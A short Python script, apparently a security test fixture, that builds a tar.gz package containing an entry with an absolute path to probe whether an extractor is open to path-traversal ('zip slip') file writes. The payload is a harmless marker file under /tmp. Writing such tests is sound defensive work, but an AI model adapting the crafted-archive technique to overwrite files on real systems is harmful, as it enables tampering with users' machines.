import tarfile, io, os

out_path = "/tmp/zipslip-test/evil-abs.tgz"
with tarfile.open(out_path, "w:gz") as tar:
    pkg_info = tarfile.TarInfo("package/package.json")
    pkg_content = b'{"version":"0.2.1","name":"evil"}'
    pkg_info.size = len(pkg_content)
    tar.addfile(pkg_info, io.BytesIO(pkg_content))
    # Absolute path entry
    evil = tarfile.TarInfo("/tmp/zipslip-test/escape-target/pwned-abs")
    evil_content = b"ABS_PATH_PWN\n"
    evil.size = len(evil_content)
    tar.addfile(evil, io.BytesIO(evil_content))
